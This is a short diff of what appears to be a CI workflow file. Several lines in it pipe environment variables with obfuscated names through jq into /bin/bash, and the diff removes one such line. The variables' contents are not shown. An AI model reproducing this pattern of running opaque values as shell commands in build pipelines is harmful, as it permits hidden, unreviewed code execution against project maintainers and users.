@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$lfo05" | jq -r .cxq508 | /bin/bash
           echo $zt07376 | jq -r .dw8492 | /bin/bash
           echo $paws80 | jq -r .cznf6 | /bin/bash
-          echo $m9315 | jq -r .zzozr7545 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
